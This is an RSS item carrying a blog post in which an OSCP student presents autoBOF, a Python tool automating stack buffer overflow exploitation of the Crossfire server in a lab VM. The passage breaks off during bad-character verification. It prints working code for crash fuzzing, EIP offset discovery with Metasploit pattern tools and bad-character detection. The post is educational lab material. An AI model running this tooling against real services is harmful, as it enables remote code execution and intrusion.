<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
    <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415</link>
    <description>**TL;DR I wrote a program to automate buffer overflows. I talk about what buffer overflows are, why I made this program, and show all the code I used.**

In 11 days from now, it will have been a year since I first started on my journey of becoming an Offensive Security Certified Professional. In 15 days from now, it will have been a year since the lowest point in my infosec journey. I was feeling very discouraged and out of my depth. During the 4 days in between, I had been breezing through the material - covering multiple sections of coursework in a day. But when I got to the buffer overflow section of the learning material, and it just did not click with me. I failed over and over again for 3 straight days to grasp the material. I began to wonder if I had tried to do too much, too fast and wasn&#39;t sure if I was in over my head or not. I stayed up late that third day, trying to get back on track, and I finally exploited the practice server Offsec provided me. I was ecstatic! And for the most part, I moved on to the next part of my coursework, filing away that new knowledge for the time being. But those three days planted a small seed of pure vengeance in my heart. &quot;Screw buffer overflows!&quot;, the seed said. &quot;You should make it so no one ever has to make these again!&quot;.

As it would turn out, my university wanted me to make something before they&#39;d let me graduate. As long as my advisor deemed it sufficiently complex of a task, I could make whatever my heart desired. As previously stated, my heart desired vengeance (being very fertile soil for such things). Fortunately my advisor thought the idea was interesting and gave me the go-ahead. My first step was to create a design document, outlining the intended functionality of my little project and what it&#39;d look like at each stage. I dreamed very big. The original intention for autoBOF was cross-platform with support for integrating multiple different debuggers in the process. In fact, it was also intended to be a tool used remotely - a thin client that would connect to a remote laboratory environment. It would be a masterpiece, a sword crafted to slay the tedious monster of my past.

None of that happened of course, and the tool ended up being about 500 lines of poorly optimized python that can only run on a local (Linux) laboratory environment. It&#39;s wonky, takes about a minute to run in a best-case scenario, and doesn&#39;t perform anywhere near as well as I originally expected it to. But it works. At least, it works against the crossfire application included in my PWK Kali VM. I do not have the illusion that my code is of any particular quality. In fact, if my professors actually looked at the code I&#39;m about to show you, they may take away the CS degree I expect to receive next month.

Despite having said all of that, this took a lot of effort to make on my part, mostly during the hours of 10PM and 3AM before my weekly progress reports, as well as 0 to 3 random afternoons of any given week. There were also a couple occasions where I over promised what I would accomplish during a given period of time and had to frantically work to make up the difference. It seemed that every time I tried to take something I knew how to do manually and have my program do it automatically, I ran into some difficult (to me) problem to solve that I never anticipated beforehand. Because the tasks required for this program had an extremely minimal overlap with my formal education in programming, I had to break new ground whenever I wanted to do anything. Did I mention this is the first python program I&#39;ve written? Anyway, let&#39;s briefly discuss how these kinds of buffer overflows work and then get to the code.

----

The kind of buffer overflow autoBOF intends to exploit is a very basic kind of overflow. Say there is a server somewhere, that accepts data and stores it in a variable somewhere. Kind of a stretch, but bear with me. And then let&#39;s assume that this server stores this data in variables of a fixed length. What happens if the server lets you send it more data than it can store? What does it do with the extra data? In our ideal case, it just puts it in adjacent memory space, overwriting some other poor sap&#39;s data. And if we can write to system memory… can&#39;t we tell the server to do things it&#39;s not supposed to? That&#39;s the plan! Our general approach is:

1. Fuzz the target server. Does it crash when we send lots of data?
2. If the server crashes, we may have done something! Let&#39;s find out exactly how much data it takes to crash the server.
3. We discover that the server crashes when we send X bytes, and the register that directs program execution is overwritten at Y bytes. So we can execute X - Y bytes of code. Hurray!
4. Sometimes, certain values aren&#39;t processed by the server the way we want them to be processed. Let&#39;s send every relevant value to the server and see if they come out the way we want them to. If not, those values are &#39;bad&#39; and of an undiscerning character. So we call them &#39;bad characters&#39;. Or some reason like that.
5. Next, we need to find a JMP instruction to hijack. We need to tell the program to jump to the payload we make and execute it.
6. Lastly, if there&#39;s enough space between X and Y to fit our whole payload, we generate one and send it in! If there isn&#39;t enough space, we can put the payload inside our buffer (before Y bytes of data), and hope that we have enough space in the payload space to say &#39;Jump to the payload at the start of the buffer&#39;.

Note: Please forgive me for any improper indentations. I had to change leading spaces to `&amp;nbsp;` and may have missed some. You can find the original code at https://github.com/DiscipleOfDust/autoBOF

----

```python
#!/usr/bin/python
# -*- coding: utf-8 -*- 
import socket, sys
import os
import time #make fuzzing more robust (sticky note)
if(sys.argv[1] == &quot;-help&quot; or sys.argv[1] == &quot;-h&quot;): #consider two modes - one with user input, and the other with command line logic
 print &quot;Usage: python autoBOF.py -start [initial data sequence including spaces] -end [any post-payload data sequence including spaces] -l [minimum buffer length] [maximum buffer length] -i [number of bytes to increment buffer by for each attempt] -target [remote IP] [remote port] -local [local IP] [shell port] -p [maximum attempts at payload generation] -n [name of exploit] -s [verbose by default, include to minimize stdout] \n\nExample: python autoBOF.py -start \&quot;x11(setup sound \&quot; -end \&quot;x90x00#\&quot; -l 4368 4400 -i 1 -target 127.0.0.1 13327 -local 127.0.0.1 1337 -p 5 -n overflow.py \nAlternatively, type \&quot;python autoBOF.py -config /path/to/file.txt\&quot; to use a configuration file instead&quot; 
 print &quot;--------------------------------------------------------------------------------------------------&quot;
 print &quot;Config file format example:\nstart: \x11(setup sound \nend:\x90\x00#\nlengthMin: 4368\nlengthMax: 4400\nincrement: 1\ntargetIP: 127.0.0.1\ntargetPort: 13327\nlocalIP: 127.0.0.1\nshellPort: 1337\npayloadAttempts: 5\nexploitName: autoExploit.py\nsilent: False&quot;
 print &quot;--------------------------------------------------------------------------------------------------&quot;
 print &quot;IMPORTANT: Requires partner script, restart.py to be running in tandem. Usage for restart.py: Move file to directory containing vulnerable service binary and type \&quot;gdb -q -x restart.py [service name]\&quot;&quot;
 sys.exit()
#init vals
curVal = 0
argStart = &#39;autoBOF&#39; #AutoBOF is uninit value for input checking
argEnd = &#39;autoBOF&#39;
argLengthMin = &#39;autoBOF&#39;
argLengthMax = &#39;autoBOF&#39;
argIncrement = &#39;autoBOF&#39;
argTargetIP = &#39;autoBOF&#39;
argTargetPort = &#39;autoBOF&#39;
argLocalIP = &#39;autoBOF&#39;
argShellport = &#39;autoBOF&#39;
argPayloadAttempts = &#39;autoBOF&#39;
argExploitName = &#39;autoBOF&#39;
argSilent = False

if(sys.argv[1] != &quot;-config&quot;):
 for x in sys.argv:
  curVal = curVal + 1
  if (x == &quot;-start&quot;):
   argStart = sys.argv[curVal] #Consider escaping these like below
   argStart = argStart.decode(&#39;string_escape&#39;)
  elif(x == &quot;-end&quot;):
   argEnd = sys.argv[curVal]
   argEnd = argEnd.decode(&#39;string_escape&#39;)
  elif(x == &quot;-l&quot;):
   argLengthMin = sys.argv[curVal]
   argLengthMax = sys.argv[curVal+1]
  elif(x == &quot;-i&quot;):
   argIncrement = sys.argv[curVal]
  elif(x == &quot;-target&quot;):
   argTargetIP =  sys.argv[curVal]
   argTargetPort = sys.argv[curVal+1]
  elif(x == &quot;-local&quot;):
   argLocalIP = sys.argv[curVal]
   argShellPort = sys.argv[curVal+1]
  elif(x == &quot;-p&quot;):
   argPayloadAttempts = sys.argv[curVal]
  elif(x == &quot;-n&quot;):
   argExploitName = sys.argv[curVal]
  elif(x == &quot;-s&quot;):
   argSilent = True
else:
 fileName = sys.argv[2]
 bufFile = open(fileName,&quot;r&quot;)
 configFile = bufFile.read()
 configFile = configFile.split(&#39;\n&#39;) #newlines are common bad character, so not being able to parse them in config files isn&#39;t the worst thing in the world.
 tempIndex = configFile[0].find(&#39;:&#39;)
 argStart = configFile[0][tempIndex+2:]
 argStart = argStart.decode(&#39;string_escape&#39;)
 tempIndex = configFile[1].find(&#39;:&#39;)
 argEnd = configFile[1][tempIndex+2:]
 argEnd = argEnd.decode(&#39;string_escape&#39;)
 tempIndex = configFile[2].find(&#39;:&#39;)
 argLengthMin = configFile[2][tempIndex+2:]
 tempIndex = configFile[3].find(&#39;:&#39;)
 argLengthMax = configFile[3][tempIndex+2:]
 tempIndex = configFile[4].find(&#39;:&#39;)
 argIncrement = configFile[4][tempIndex+2:]
 tempIndex = configFile[5].find(&#39;:&#39;)
 argTargetIP = configFile[5][tempIndex+2:]
 tempIndex = configFile[6].find(&#39;:&#39;)
 argTargetPort = configFile[6][tempIndex+2:]
 tempIndex = configFile[7].find(&#39;:&#39;)
 argLocalIP = configFile[7][tempIndex+2:]
 tempIndex = configFile[8].find(&#39;:&#39;)
 argShellPort = configFile[8][tempIndex+2:]
 tempIndex = configFile[9].find(&#39;:&#39;)
 argPayloadAttempts = configFile[9][tempIndex+2:]
 tempIndex = configFile[10].find(&#39;:&#39;)
 argExploitName = configFile[10][tempIndex+2:]
 tempIndex = configFile[11].find(&#39;:&#39;)
 argSilent = configFile[11][tempIndex+2:]
 if (argSilent == &quot;True&quot;):
  argSilent = True
 else:
  argSilent = False
#Check the arguments for proper initialization
if(argStart == &#39;autoBOF&#39;):
 print &#39;ERROR: uninitialized start argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argEnd == &#39;autoBOF&#39;):
 print &#39;ERROR: uninitialized end argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argLengthMin == &#39;autoBOF&#39; or argLengthMin.isdigit() == False):
 print &#39;ERROR: uninitialized or invalid minimum buffer length argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argLengthMax == &#39;autoBOF&#39; or argLengthMax.isdigit() == False):
 print &#39;ERROR: uninitialized or invalid maximum buffer length argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argIncrement == &#39;autoBOF&#39; or argIncrement.isdigit() == False):
 print &#39;ERROR: uninitialized or invalid buffer length increment argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argTargetIP == &#39;autoBOF&#39;):
 print &#39;ERROR: uninitialized Target IP argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argTargetPort == &#39;autoBOF&#39; or argTargetPort.isdigit() == False):
 print &#39;ERROR: uninitialized or invalidTarget Port argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argLocalIP == &#39;autoBOF&#39;):
 print &#39;ERROR: uninitialized Local IP argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argShellPort == &#39;autoBOF&#39; or argShellPort.isdigit() == False):
 print &#39;ERROR: uninitialized Shell Port argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(argPayloadAttempts == &#39;autoBOF&#39; or argPayloadAttempts.isdigit() == False):
 print &#39;Warning: Unitialized number of payload attemps. Will be set to 3. Try autoBOF.py -h for more details&#39;
 argPayloadAttempts = 3
if(argExploitName == &#39;autoBOF&#39;):
 print &#39;ERROR: uninitialized Exploit Name argument. Try autoBOF.py -h for more details&#39;
 sys.exit()
if(len(argExploitName) &lt; 3):
 print &#39;ERROR: Exploit name must be at least three characters long&#39;
sys.exit()
```

----

Alright, so here we have how the user interacts with the program. They can either make a configuration file (my recommendation) which contains all the necessary specifications for the program to execute, or they can use flags if they are so inclined. I found there to be so many flags that I never actually tested whether or not that functionality worked. I ran into some encoding issues that made me try to configuration file as a solution, and when I solved that problem (which turned out to be completely unrelated to the input method), I slapped the same solution onto the flag parsing, but since I never tested that it may be completely broken.

You may also notice a lack of shell customization (Never got around to implementing shell customization. It might have taken half an hour, it might have taken a day). Hopefully bind shells are okay. I also hope that your service doesn&#39;t require one of the variables to be &#39;autoBOF&#39; for some reason, because then my program wouldn&#39;t work at all. Of particular note here are my half assed type checking and some random comments I don&#39;t remember making and could have sworn I removed from the code for being irrelevant or nonsensical.

----

```python
#Start program execution
if(not argSilent):
 os.system(&quot;figlet autoBOF&quot;) #Optional but very important dependency
host = argTargetIP
port = int(argTargetPort)
buffer = (&#39;\x41&#39;)
start = argStart
end = argEnd
isSuccess = False
overflow = buffer
tryUntil = int(argLengthMax)
startCount = int(argLengthMin)
increment = int(argIncrement)
if(not argSilent):
 print &quot;---- Attempting to Crash Service ----&quot;
while(startCount &lt; tryUntil and isSuccess == False):
 try:
  s = socket.socket()
  s.connect((host, port))
  data = s.recv(1024)
  startCount = startCount + increment
  if(not argSilent):
   print &quot;fuzzing at&quot;, startCount, &quot;bytes&quot;, &quot;out of&quot;, tryUntil
  overflow = start + (buffer * startCount) + end
  s.send(overflow)
  s.close()
  time.sleep(.6)
  bufFile = open(&quot;/usr/games/crossfire/bin/eip.txt&quot;, &quot;r&quot;)
  eipValue = bufFile.read()
  if(&quot;0x41414141&quot; in eipValue):
   if(not argSilent):
    print &quot;---- Service Crashed With EIP overwrite ----&quot;
    print &quot;!! Overflow at&quot;,startCount,&quot;bytes&quot;
   isSuccess = True
 except socket.error, e:
  bufFile = open(&quot;/usr/games/crossfire/bin/eip.txt&quot;, &quot;r&quot;)
  eipValue = bufFile.read()
  if(&quot;0x41414141&quot; in eipValue):
   if(not argSilent):
    print &quot;---- Service Crashed With EIP overwrite ----&quot;
    print &quot;!! Overflow at&quot;,startCount,&quot;bytes&quot;
   isSuccess = True
  break
if(not isSuccess):
 if(not argSilent):
  print &quot;---- Service is Resilient  ----&quot;
  print(&quot;No overflow up to&quot;),tryUntil,&quot;bytes&quot;
 sys.exit()
#END OVERFLOW DETECTION
```

----

I hope you like the code you see above because I copy and paste it a lot instead of reusing it in a method like a practical, efficient programmer. Here the program sends a sequence of A&#39;s to the service inside a user-specified wrapper. The debugger script I wrote (which will be shown later) dumps the eip register whenever the targeted service crashes. The code will loop until it reaches the user specified limit or until the EIP register is overwritten with A&#39;s. If it is, we can continue searching for our buffer overflow! If A is a bad character we&#39;ll be in a bit of trouble, though. Anyway, one of the problems I had with this section of code was trying to figure out the optimal way to fuzz a service. Some of these overflows only happen at extremely specific amounts of data, and a difference of one byte could make or break the exploit. As a result, I decided to leave it entirely up to the user and thus absolve myself of that responsibility. By that I mean to say I&#39;m empowering the users by maximizing the customization potential of my software.

----

```python
if(not argSilent):
 print(&quot;--- Generating Unique Buffer ---&quot;)
bashCommand = &quot;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &quot;
strTest = str(startCount)
bashCommand = bashCommand + strTest + &quot; &gt; offsetStr.txt&quot;
os.system(bashCommand)
bufFile = open(&quot;offsetStr.txt&quot;, &quot;r&quot;)
newBuffer = bufFile.read()
newBuffer = newBuffer.strip(&#39;\n&#39;)
newBuffer = start + newBuffer + end
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
bufFile = open(&quot;/usr/games/crossfire/bin/eip.txt&quot;, &quot;r&quot;)
eipValue = bufFile.read()
if(not argSilent):
 print(&quot;Unique Buffer Sent&quot;)
 print(&quot;--- Attempting EIP overwrite ---&quot;)
bashCommand = &quot;rm offsetStr.txt&quot;
os.system(bashCommand)
s.close()
time.sleep(.6)
bufFile = open(&quot;/usr/games/crossfire/bin/eip.txt&quot;, &quot;r&quot;)
eipValue = bufFile.read()
startValue = eipValue.find(&quot;0x&quot;)
eipValue = eipValue[startValue:(startValue+10)]
if(not argSilent):
 print (&quot;EIP overwrite successful&quot;)
bashCommand = &quot;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l &quot; + strTest + &quot; -q &quot; + eipValue
os.system(bashCommand + &quot; &gt; offset.txt&quot;)
bufFile = open(&quot;offset.txt&quot;)
offset = bufFile.read()
startValue = offset.find(&quot;offset&quot;)+7
offset = offset[startValue:]
offset = offset.strip(&#39;\n&#39;)
offset = int(offset)
shellSpace = startCount - offset

if(not argSilent):
print &quot;Offset is at&quot;, offset, &quot;bytes with&quot;, (shellSpace), &quot;bytes of post-offset shellcode space&quot;
```
----

The above code is very straightforward - I call Metasploit&#39;s pattern creation and offset tools to add a custom string to the buffer in order to determine exactly where the overwrite takes place. This lets me know how much space I have to work with to place shellcode. I am again aided by my lovely debugger script.

----

```python
 ########## Bad Character Phase ##########
 print &#39;--- Bad Character Detection Phase ---&#39;
#removed 00, 0A, OD, FF as common bad characters
badchars_hex = [&quot;\x00&quot;, &quot;\x0a&quot;, &quot;\x0d&quot;, &quot;\xff&quot;]
badchars_text = [&quot;00&quot;,&quot;0a&quot;,&quot;0d&quot;,&quot;ff&quot;]
allchars_hex = [&quot;\x01&quot;,&quot;\x02&quot;,&quot;\x03&quot;,&quot;\x04&quot;,&quot;\x05&quot;,&quot;\x06&quot;,&quot;\x07&quot;,&quot;\x08&quot;,&quot;\x09&quot;,&quot;\x0b&quot;,&quot;\x0c&quot;,&quot;\x0e&quot;,&quot;\x0f&quot;,&quot;\x10&quot;,&quot;\x11&quot;,&quot;\x12&quot;,&quot;\x13&quot;,&quot;\x14&quot;,&quot;\x15&quot;,&quot;\x16&quot;,&quot;\x17&quot;,&quot;\x18&quot;,&quot;\x19&quot;,&quot;\x1a&quot;,&quot;\x1b&quot;,&quot;\x1c&quot;,&quot;\x1d&quot;,&quot;\x1e&quot;,&quot;\x1f&quot;,&quot;\x20&quot;,&quot;\x21&quot;,&quot;\x22&quot;,&quot;\x23&quot;,&quot;\x24&quot;,&quot;\x25&quot;,&quot;\x26&quot;,&quot;\x27&quot;,&quot;\x28&quot;,&quot;\x29&quot;,&quot;\x2a&quot;,&quot;\x2b&quot;,&quot;\x2c&quot;,&quot;\x2d&quot;,&quot;\x2e&quot;,&quot;\x2f&quot;,&quot;\x30&quot;,&quot;\x31&quot;,&quot;\x32&quot;,&quot;\x33&quot;,&quot;\x34&quot;,&quot;\x35&quot;,&quot;\x36&quot;,&quot;\x37&quot;,&quot;\x38&quot;,&quot;\x39&quot;,&quot;\x3a&quot;,&quot;\x3b&quot;,&quot;\x3c&quot;,&quot;\x3d&quot;,&quot;\x3e&quot;,&quot;\x3f&quot;,&quot;\x40&quot;,&quot;\x41&quot;,&quot;\x42&quot;,&quot;\x43&quot;,&quot;\x44&quot;,&quot;\x45&quot;,&quot;\x46&quot;,&quot;\x47&quot;,&quot;\x48&quot;,&quot;\x49&quot;,&quot;\x4a&quot;,&quot;\x4b&quot;,&quot;\x4c&quot;,&quot;\x4d&quot;,&quot;\x4e&quot;,&quot;\x4f&quot;,&quot;\x50&quot;,&quot;\x51&quot;,&quot;\x52&quot;,&quot;\x53&quot;,&quot;\x54&quot;,&quot;\x55&quot;,&quot;\x56&quot;,&quot;\x57&quot;,&quot;\x58&quot;,&quot;\x59&quot;,&quot;\x5a&quot;,&quot;\x5b&quot;,&quot;\x5c&quot;,&quot;\x5d&quot;,&quot;\x5e&quot;,&quot;\x5f&quot;,&quot;\x60&quot;,&quot;\x61&quot;,&quot;\x62&quot;,&quot;\x63&quot;,&quot;\x64&quot;,&quot;\x65&quot;,&quot;\x66&quot;,&quot;\x67&quot;,&quot;\x68&quot;,&quot;\x69&quot;,&quot;\x6a&quot;,&quot;\x6b&quot;,&quot;\x6c&quot;,&quot;\x6d&quot;,&quot;\x6e&quot;,&quot;\x6f&quot;,&quot;\x70&quot;,&quot;\x71&quot;,&quot;\x72&quot;,&quot;\x73&quot;,&quot;\x74&quot;,&quot;\x75&quot;,&quot;\x76&quot;,&quot;\x77&quot;,&quot;\x78&quot;,&quot;\x79&quot;,&quot;\x7a&quot;,&quot;\x7b&quot;,&quot;\x7c&quot;,&quot;\x7d&quot;,&quot;\x7e&quot;,&quot;\x7f&quot;,&quot;\x80&quot;,&quot;\x81&quot;,&quot;\x82&quot;,&quot;\x83&quot;,&quot;\x84&quot;,&quot;\x85&quot;,&quot;\x86&quot;,&quot;\x87&quot;,&quot;\x88&quot;,&quot;\x89&quot;,&quot;\x8a&quot;,&quot;\x8b&quot;,&quot;\x8c&quot;,&quot;\x8d&quot;,&quot;\x8e&quot;,&quot;\x8f&quot;,&quot;\x90&quot;,&quot;\x91&quot;,&quot;\x92&quot;,&quot;\x93&quot;,&quot;\x94&quot;,&quot;\x95&quot;,&quot;\x96&quot;,&quot;\x97&quot;,&quot;\x98&quot;,&quot;\x99&quot;,&quot;\x9a&quot;,&quot;\x9b&quot;,&quot;\x9c&quot;,&quot;\x9d&quot;,&quot;\x9e&quot;,&quot;\x9f&quot;,&quot;\xa0&quot;,&quot;\xa1&quot;,&quot;\xa2&quot;,&quot;\xa3&quot;,&quot;\xa4&quot;,&quot;\xa5&quot;,&quot;\xa6&quot;,&quot;\xa7&quot;,&quot;\xa8&quot;,&quot;\xa9&quot;,&quot;\xaa&quot;,&quot;\xab&quot;,&quot;\xac&quot;,&quot;\xad&quot;,&quot;\xae&quot;,&quot;\xaf&quot;,&quot;\xb0&quot;,&quot;\xb1&quot;,&quot;\xb2&quot;,&quot;\xb3&quot;,&quot;\xb4&quot;,&quot;\xb5&quot;,&quot;\xb6&quot;,&quot;\xb7&quot;,&quot;\xb8&quot;,&quot;\xb9&quot;,&quot;\xba&quot;,&quot;\xbb&quot;,&quot;\xbc&quot;,&quot;\xbd&quot;,&quot;\xbe&quot;,&quot;\xbf&quot;,&quot;\xc0&quot;,&quot;\xc1&quot;,&quot;\xc2&quot;,&quot;\xc3&quot;,&quot;\xc4&quot;,&quot;\xc5&quot;,&quot;\xc6&quot;,&quot;\xc7&quot;,&quot;\xc8&quot;,&quot;\xc9&quot;,&quot;\xca&quot;,&quot;\xcb&quot;,&quot;\xcc&quot;,&quot;\xcd&quot;,&quot;\xce&quot;,&quot;\xcf&quot;,&quot;\xd0&quot;,&quot;\xd1&quot;,&quot;\xd2&quot;,&quot;\xd3&quot;,&quot;\xd4&quot;,&quot;\xd5&quot;,&quot;\xd6&quot;,&quot;\xd7&quot;,&quot;\xd8&quot;,&quot;\xd9&quot;,&quot;\xda&quot;,&quot;\xdb&quot;,&quot;\xdc&quot;,&quot;\xdd&quot;,&quot;\xde&quot;,&quot;\xdf&quot;,&quot;\xe0&quot;,&quot;\xe1&quot;,&quot;\xe2&quot;,&quot;\xe3&quot;,&quot;\xe4&quot;,&quot;\xe5&quot;,&quot;\xe6&quot;,&quot;\xe7&quot;,&quot;\xe8&quot;,&quot;\xe9&quot;,&quot;\xea&quot;,&quot;\xeb&quot;,&quot;\xec&quot;,&quot;\xed&quot;,&quot;\xee&quot;,&quot;\xef&quot;,&quot;\xf0&quot;,&quot;\xf1&quot;,&quot;\xf2&quot;,&quot;\xf3&quot;,&quot;\xf4&quot;,&quot;\xf5&quot;,&quot;\xf6&quot;,&quot;\xf7&quot;,&quot;\xf8&quot;,&quot;\xf9&quot;,&quot;\xfa&quot;,&quot;\xfb&quot;,&quot;\xfc&quot;,&quot;\xfd&quot;,&quot;\xfe&quot;]
allchars_text = [&quot;01&quot;,&quot;02&quot;,&quot;03&quot;,&quot;04&quot;,&quot;05&quot;,&quot;06&quot;,&quot;07&quot;,&quot;08&quot;,&quot;09&quot;,&quot;0b&quot;,&quot;0c&quot;,&quot;0e&quot;,&quot;0f&quot;,&quot;10&quot;,&quot;11&quot;,&quot;12&quot;,&quot;13&quot;,&quot;14&quot;,&quot;15&quot;,&quot;16&quot;,&quot;17&quot;,&quot;18&quot;,&quot;19&quot;,&quot;1a&quot;,&quot;1b&quot;,&quot;1c&quot;,&quot;1d&quot;,&quot;1e&quot;,&quot;1f&quot;,&quot;20&quot;,&quot;21&quot;,&quot;22&quot;,&quot;23&quot;,&quot;24&quot;,&quot;25&quot;,&quot;26&quot;,&quot;27&quot;,&quot;28&quot;,&quot;29&quot;,&quot;2a&quot;,&quot;2b&quot;,&quot;2c&quot;,&quot;2d&quot;,&quot;2e&quot;,&quot;2f&quot;,&quot;30&quot;,&quot;31&quot;,&quot;32&quot;,&quot;33&quot;,&quot;34&quot;,&quot;35&quot;,&quot;36&quot;,&quot;37&quot;,&quot;38&quot;,&quot;39&quot;,&quot;3a&quot;,&quot;3b&quot;,&quot;3c&quot;,&quot;3d&quot;,&quot;3e&quot;,&quot;3f&quot;,&quot;40&quot;,&quot;41&quot;,&quot;42&quot;,&quot;43&quot;,&quot;44&quot;,&quot;45&quot;,&quot;46&quot;,&quot;47&quot;,&quot;48&quot;,&quot;49&quot;,&quot;4a&quot;,&quot;4b&quot;,&quot;4c&quot;,&quot;4d&quot;,&quot;4e&quot;,&quot;4f&quot;,&quot;50&quot;,&quot;51&quot;,&quot;52&quot;,&quot;53&quot;,&quot;54&quot;,&quot;55&quot;,&quot;56&quot;,&quot;57&quot;,&quot;58&quot;,&quot;59&quot;,&quot;5a&quot;,&quot;5b&quot;,&quot;5c&quot;,&quot;5d&quot;,&quot;5e&quot;,&quot;5f&quot;,&quot;60&quot;,&quot;61&quot;,&quot;62&quot;,&quot;63&quot;,&quot;64&quot;,&quot;65&quot;,&quot;66&quot;,&quot;67&quot;,&quot;68&quot;,&quot;69&quot;,&quot;6a&quot;,&quot;6b&quot;,&quot;6c&quot;,&quot;6d&quot;,&quot;6e&quot;,&quot;6f&quot;,&quot;70&quot;,&quot;71&quot;,&quot;72&quot;,&quot;73&quot;,&quot;74&quot;,&quot;75&quot;,&quot;76&quot;,&quot;77&quot;,&quot;78&quot;,&quot;79&quot;,&quot;7a&quot;,&quot;7b&quot;,&quot;7c&quot;,&quot;7d&quot;,&quot;7e&quot;,&quot;7f&quot;,&quot;80&quot;,&quot;81&quot;,&quot;82&quot;,&quot;83&quot;,&quot;84&quot;,&quot;85&quot;,&quot;86&quot;,&quot;87&quot;,&quot;88&quot;,&quot;89&quot;,&quot;8a&quot;,&quot;8b&quot;,&quot;8c&quot;,&quot;8d&quot;,&quot;8e&quot;,&quot;8f&quot;,&quot;90&quot;,&quot;91&quot;,&quot;92&quot;,&quot;93&quot;,&quot;94&quot;,&quot;95&quot;,&quot;96&quot;,&quot;97&quot;,&quot;98&quot;,&quot;99&quot;,&quot;9a&quot;,&quot;9b&quot;,&quot;9c&quot;,&quot;9d&quot;,&quot;9e&quot;,&quot;9f&quot;,&quot;a0&quot;,&quot;a1&quot;,&quot;a2&quot;,&quot;a3&quot;,&quot;a4&quot;,&quot;a5&quot;,&quot;a6&quot;,&quot;a7&quot;,&quot;a8&quot;,&quot;a9&quot;,&quot;aa&quot;,&quot;ab&quot;,&quot;ac&quot;,&quot;ad&quot;,&quot;ae&quot;,&quot;af&quot;,&quot;b0&quot;,&quot;b1&quot;,&quot;b2&quot;,&quot;b3&quot;,&quot;b4&quot;,&quot;b5&quot;,&quot;b6&quot;,&quot;b7&quot;,&quot;b8&quot;,&quot;b9&quot;,&quot;ba&quot;,&quot;bb&quot;,&quot;bc&quot;,&quot;bd&quot;,&quot;be&quot;,&quot;bf&quot;,&quot;c0&quot;,&quot;c1&quot;,&quot;c2&quot;,&quot;c3&quot;,&quot;c4&quot;,&quot;c5&quot;,&quot;c6&quot;,&quot;c7&quot;,&quot;c8&quot;,&quot;c9&quot;,&quot;ca&quot;,&quot;cb&quot;,&quot;cc&quot;,&quot;cd&quot;,&quot;ce&quot;,&quot;cf&quot;,&quot;d0&quot;,&quot;d1&quot;,&quot;d2&quot;,&quot;d3&quot;,&quot;d4&quot;,&quot;d5&quot;,&quot;d6&quot;,&quot;d7&quot;,&quot;d8&quot;,&quot;d9&quot;,&quot;da&quot;,&quot;db&quot;,&quot;dc&quot;,&quot;dd&quot;,&quot;de&quot;,&quot;df&quot;,&quot;e0&quot;,&quot;e1&quot;,&quot;e2&quot;,&quot;e3&quot;,&quot;e4&quot;,&quot;e5&quot;,&quot;e6&quot;,&quot;e7&quot;,&quot;e8&quot;,&quot;e9&quot;,&quot;ea&quot;,&quot;eb&quot;,&quot;ec&quot;,&quot;ed&quot;,&quot;ee&quot;,&quot;ef&quot;,&quot;f0&quot;,&quot;f1&quot;,&quot;f2&quot;,&quot;f3&quot;,&quot;f4&quot;,&quot;f5&quot;,&quot;f6&quot;,&quot;f7&quot;,&quot;f8&quot;,&quot;f9&quot;,&quot;fa&quot;,&quot;fb&quot;,&quot;fc&quot;,&quot;fd&quot;,&quot;fe&quot;]
bufCount = 0
allchars_unsure_hex = []
allchars_unsure_text = []
while(len(allchars_hex) &gt; 4):
 section_hex = allchars_hex[3] + allchars_hex[2] + allchars_hex[1] + allchars_hex[0]
 section_text = allchars_text[0] + allchars_text[1] + allchars_text[2] + allchars_text[3]
 bufCount = bufCount + 1
 section_text = section_text.replace(&quot;\\&quot;, &quot;&quot;)
 section_text = section_text.replace(&quot;x&quot;, &quot;&quot;)
 section_text = &quot;0x&quot; + section_text
 if(not argSilent):
  print section_text, &quot;Section being searched for in memory&quot;
 newBuffer = start + &quot;BBBB&quot; + section_hex + (&quot;\x41&quot; * (offset-8)) + &quot;CCCC&quot; + (shellSpace * &quot;/x41&quot;) + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open(&quot;/usr/games/crossfire/bin/badchars.txt&quot;, &quot;r&quot;)
 badData = bufFile.read()

 firstEggLocation = badData.find(&quot;0x42424242&quot;) + 11
 lastEggLocation = badData.find(&quot;0x41414141&quot;)
 badData = badData[firstEggLocation:lastEggLocation]
 if(not argSilent):
  print &quot;-----stack------&quot;
  print badData
  print &quot;------------------&quot;

 if(section_text in badData):
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]
  continue
 else:
  if(not argSilent):
   print &quot;BAD CHARACTER DETECTED IN &quot;, section_text
  #move to unsure variabless
  allchars_unsure_text =  allchars_unsure_text + allchars_text[:4]
  allchars_unsure_hex =  allchars_unsure_hex + allchars_hex[:4]
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]

allchars_unsure_hex = allchars_unsure_hex + allchars_hex
allchars_unsure_text = allchars_unsure_text + allchars_text
if(not argSilent):
 print &quot;unsure values are&quot;, allchars_unsure_text
 print &quot;---Verifying Bad Characters ---&quot;
#Final Badchar Verification Phase
while(len(allchars_unsure_hex) &gt; 0):
 section_hex = &quot;\x41&quot; + &quot;\x41&quot; + &quot;\x41&quot; + allchars_unsure_hex[0]
 section_text = allchars_unsure_text[0] + &quot;414141&quot;
 section_text = section_text.replace(&quot;\\&quot;, &quot;&quot;)
 section_text = section_text.replace(&quot;x&quot;, &quot;&quot;)
 section_text = &quot;0x&quot; + section_text
 if(not argSilent):
  print section_text, &quot;Section being searched for in memory&quot;
